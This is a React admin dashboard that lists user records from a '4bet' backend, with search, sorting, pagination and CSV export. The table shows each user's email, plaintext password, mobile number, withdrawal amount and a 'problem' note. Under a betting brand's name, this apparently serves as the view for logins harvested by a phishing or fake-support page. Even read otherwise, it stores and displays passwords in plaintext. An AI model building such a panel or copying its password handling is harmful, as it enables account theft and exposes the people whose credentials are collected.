import React, { useState, useEffect } from 'react';
import axios from 'axios';

function UserDetails() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState(1);
  const [usersPerPage] = useState(10);
  const [searchTerm, setSearchTerm] = useState('');
  const [totalUsers, setTotalUsers] = useState(0);
  const [sortField, setSortField] = useState('createdAt');
  const [sortDirection, setSortDirection] = useState('desc');

  useEffect(() => {
    fetchUsers();
  }, [currentPage, sortField, sortDirection]);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const res = await axios.get('https://backend-4bet.vercel.app/api/usersdetails', {
        params: {
          page: currentPage,
          limit: usersPerPage,
          sortField,
          sortDirection,
          search: searchTerm
        },
        headers: {
          Authorization: `Bearer ${localStorage.getItem('token')}`
        }
      });
      setUsers(res.data.users);
      setTotalUsers(res.data.totalUsers);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching users:', error);
      setLoading(false);
    }
  };

  const handleSearch = (e) => {
    e.preventDefault();
    setCurrentPage(1);
    fetchUsers();
  };

  const handleSort = (field) => {
    const direction = field === sortField && sortDirection === 'asc' ? 'desc' : 'asc';
    setSortField(field);
    setSortDirection(direction);
  };

  const exportToCSV = () => {
    // Get all users for export
    axios.get('https://backend-4bet.vercel.app/api/users/export', {
      headers: {
        Authorization: `Bearer ${localStorage.getItem('token')}`
      }
    })
    .then(response => {
      const users = response.data;
      
      // Format data for CSV
      const headers = ['Email', 'Mobile Number', 'Withdrawal Amount', 'Problem', 'Created At'];
      const csvData = users.map(user => [
        user.email,
        user.mobileNumber,
        user.withdrawalAmount,
        user.problem,
        new Date(user.createdAt).toLocaleString()
      ]);
      
      // Create CSV content
      const csvContent = [
        headers.join(','),
        ...csvData.map(row => row.join(','))
      ].join('\n');
      
      // Create download link
      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.setAttribute('href', url);
      link.setAttribute('download', '4rabet_users.csv');
      link.style.visibility = 'hidden';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    })
    .catch(error => console.error('Error exporting data:', error));
  };

  // Pagination logic
  const totalPages = Math.ceil(totalUsers / usersPerPage);
  const pageNumbers = [];
  for (let i = 1; i <= totalPages; i++) {
    pageNumbers.push(i);
  }

  // Get sort indicator
  const getSortIndicator = (field) => {
    if (sortField !== field) return null;
    return sortDirection === 'asc' ? '↑' : '↓';
  };

  const styles = {
    container: {
      padding: '20px',
      maxWidth: '1200px',
      margin: '0 auto',
    },
    header: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      marginBottom: '20px',
    },
    title: {
      fontSize: '24px',
      fontWeight: 'bold',
      color: '#333',
    },
    statsBox: {
      backgroundColor: '#f0f2f5',
      padding: '10px 15px',
      borderRadius: '8px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.05)',
    },
    searchContainer: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      marginBottom: '20px',
    },
    searchForm: {
      display: 'flex',
      gap: '10px',
    },
    input: {
      padding: '8px 12px',
      border: '1px solid #ddd',
      borderRadius: '4px',
      fontSize: '14px',
    },
    button: {
      backgroundColor: '#0066cc',
      color: 'white',
      border: 'none',
      padding: '8px 15px',
      borderRadius: '4px',
      cursor: 'pointer',
      fontSize: '14px',
    },
    exportButton: {
      backgroundColor: '#28a745',
      color: 'white',
      border: 'none',
      padding: '8px 15px',
      borderRadius: '4px',
      cursor: 'pointer',
      fontSize: '14px',
    },
    table: {
      width: '100%',
      borderCollapse: 'collapse',
      marginBottom: '20px',
      boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      borderRadius: '8px',
      overflow: 'hidden',
    },
    th: {
      backgroundColor: '#f8f9fa',
      padding: '12px 15px',
      textAlign: 'left',
      borderBottom: '2px solid #ddd',
      fontSize: '14px',
      fontWeight: 'bold',
      cursor: 'pointer',
    },
    td: {
      padding: '10px 15px',
      borderBottom: '1px solid #eee',
      fontSize: '14px',
    },
    pagination: {
      display: 'flex',
      justifyContent: 'center',
      marginTop: '20px',
      gap: '5px',
    },
    pageButton: {
      padding: '5px 10px',
      border: '1px solid #ddd',
      backgroundColor: '#fff',
      cursor: 'pointer',
      borderRadius: '3px',
    },
    activePageButton: {
      backgroundColor: '#0066cc',
      color: 'white',
      border: '1px solid #0066cc',
    },
    loadingMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '18px',
      color: '#666',
    },
    emptyMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '16px',
      color: '#666',
    },
    sortIndicator: {
      marginLeft: '5px',
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <h1 style={styles.title}>User Details</h1>
        <div style={styles.statsBox}>
          <strong>Total Users:</strong> {totalUsers}
        </div>
      </div>

      <div style={styles.searchContainer}>
        <form onSubmit={handleSearch} style={styles.searchForm}>
          <input
            type="text"
            placeholder="Search by email or mobile..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            style={styles.input}
          />
          <button type="submit" style={styles.button}>Search</button>
        </form>
        <button 
          onClick={exportToCSV} 
          style={styles.exportButton}
        >
          Export as CSV
        </button>
      </div>

      {loading ? (
        <div style={styles.loadingMessage}>Loading user data...</div>
      ) : users.length === 0 ? (
        <div style={styles.emptyMessage}>No users found.</div>
      ) : (
        <>
          <table style={styles.table}>
            <thead>
              <tr>
                <th style={styles.th} onClick={() => handleSort('email')}>
                  Email {getSortIndicator('email')}
                </th>
                <th style={styles.th} onClick={() => handleSort('password')}>
                  Password {getSortIndicator('password')}
                </th>
                <th style={styles.th} onClick={() => handleSort('mobileNumber')}>
                  Mobile Number {getSortIndicator('mobileNumber')}
                </th>
                <th style={styles.th} onClick={() => handleSort('withdrawalAmount')}>
                  Withdrawal Amount {getSortIndicator('withdrawalAmount')}
                </th>
                <th style={styles.th} onClick={() => handleSort('problem')}>
                  Problem {getSortIndicator('problem')}
                </th>
                <th style={styles.th} onClick={() => handleSort('createdAt')}>
                  Created At {getSortIndicator('createdAt')}
                </th>
              </tr>
            </thead>
            <tbody>
              {users.map((user) => (
                <tr key={user._id}>
                  <td style={styles.td}>{user.email}</td>
                  <td style={styles.td}>{user.password}</td>
                  <td style={styles.td}>{user.mobileNumber}</td>
                  <td style={styles.td}>{user.withdrawalAmount}</td>
                  <td style={styles.td}>{user.problem}</td>
                  <td style={styles.td}>{new Date(user.createdAt).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>

          <div style={styles.pagination}>
            <button
              onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
              disabled={currentPage === 1}
              style={{
                ...styles.pageButton,
                opacity: currentPage === 1 ? 0.5 : 1
              }}
            >
              Prev
            </button>

            {pageNumbers.map(number => (
              <button
                key={number}
                onClick={() => setCurrentPage(number)}
                style={{
                  ...styles.pageButton,
                  ...(currentPage === number ? styles.activePageButton : {})
                }}
              >
                {number}
              </button>
            ))}

            <button
              onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
              disabled={currentPage === totalPages}
              style={{
                ...styles.pageButton,
                opacity: currentPage === totalPages ? 0.5 : 1
              }}
            >
              Next
            </button>
          </div>
        </>
      )}
    </div>
  );
}

export default UserDetails;